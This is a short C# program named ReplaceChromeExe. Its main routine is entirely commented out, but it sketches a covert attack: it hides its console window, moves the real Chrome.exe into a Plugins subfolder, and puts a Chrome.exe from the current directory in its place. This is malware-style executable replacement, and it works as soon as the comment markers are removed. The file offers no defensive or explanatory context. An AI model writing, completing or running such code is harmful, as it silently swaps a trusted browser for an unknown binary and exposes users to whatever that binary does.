using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ReplaceChromeExe
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void Main(string[] args)
        {
            //var handle = GetConsoleWindow();
            //// Hide
            //ShowWindow(handle, SW_HIDE);
            //String orig = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\Chrome.exe";
            //String dest = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\Plugins\\Chrome.exe";
            //try {
            //    File.Move(orig, dest);
            //}
            //catch(Exception e)
            //{

            //}
            //orig = Directory.GetCurrentDirectory()+"\\Chrome.exe";
            //dest = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\Chrome.exe";
            //File.Move(orig, dest);

        }

        const int SW_HIDE = 0;
    }
}
